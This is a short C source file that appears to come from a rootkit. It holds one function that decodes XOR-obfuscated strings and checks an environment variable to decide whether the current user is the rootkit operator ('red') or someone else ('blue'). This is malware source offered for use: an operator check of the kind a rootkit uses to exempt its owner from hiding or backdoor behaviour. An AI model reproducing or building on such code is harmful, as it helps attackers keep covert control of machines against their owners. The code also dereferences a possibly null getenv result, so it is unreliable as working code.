#include "../rkconsts.h"


int is_rk_user(void) {
    // Checks if user is the rootkit user
    int rk;
    char *env_var = strdup(ENV_VAR_NAME); xor(env_var);
    char *env_var_val = strdup(ENV_VAR_VAL); xor(env_var_val);
    if (strcmp(getenv(env_var), env_var_val) == 0) {
        DEBUG_MSG("[*] Hello red\n");
        rk = 1;
        return rk;
    }
    DEBUG_MSG("[*] Hello blue\n");
    rk = 0;
    return rk;
}